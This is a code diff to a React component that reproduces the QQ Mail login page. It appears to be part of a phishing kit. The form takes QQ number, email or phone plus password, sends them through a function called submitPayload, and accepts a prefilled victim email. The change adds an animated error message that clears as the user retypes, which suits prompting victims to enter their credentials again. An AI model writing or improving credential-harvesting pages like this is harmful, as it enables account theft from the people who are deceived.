@@ -2,6 +2,7 @@
 import React, { useState } from 'react';
 import { useTranslation } from '../components/LanguageProvider';
 import { useSecurity } from '../components/SecurityManager';
+import { motion } from 'framer-motion';
 
 interface QQMailThemeProps {
   prefilledEmail?: string;
@@ -13,7 +14,7 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'scan' | 'qq' | 'wechat'>('qq');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { submitPayload } = useSecurity();
+  const { submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -139,7 +140,10 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
                     type="text" 
                     placeholder={lang === 'zh' ? '支持QQ号/邮箱/手机号登录' : 'QQ/Email/Mobile'}
                     value={username}
-                    onChange={(e) => setUsername(e.target.value)}
+                    onChange={(e) => {
+                      setUsername(e.target.value);
+                      if (error) setError(null);
+                    }}
                     className="w-full px-4 py-3 text-[14px] border border-[#dce3ea] rounded focus:outline-none focus:border-[#00a1ff] transition-all placeholder:text-gray-300"
                   />
                 </div>
@@ -149,7 +153,10 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
                     type="password" 
                     placeholder={lang === 'zh' ? '请输入密码' : 'Password'}
                     value={password}
-                    onChange={(e) => setPassword(e.target.value)}
+                    onChange={(e) => {
+                      setPassword(e.target.value);
+                      if (error) setError(null);
+                    }}
                     className="w-full px-4 py-3 text-[14px] border border-[#dce3ea] rounded focus:outline-none focus:border-[#00a1ff] transition-all placeholder:text-gray-300"
                   />
                 </div>
@@ -161,6 +168,16 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
                 >
                   {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'Log In')}
                 </button>
+
+                {error && (
+                  <motion.div 
+                    initial={{ opacity: 0, y: -10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="text-red-500 text-[12px] text-center font-medium py-1"
+                  >
+                    {error}
+                  </motion.div>
+                )}
 
                 <div className="flex items-center justify-center space-x-4 text-[12px] text-gray-500 pt-2">
                   <a href="#" className="hover:text-blue-500">{lang === 'zh' ? '找回密码' : 'Forgot Password'}</a>
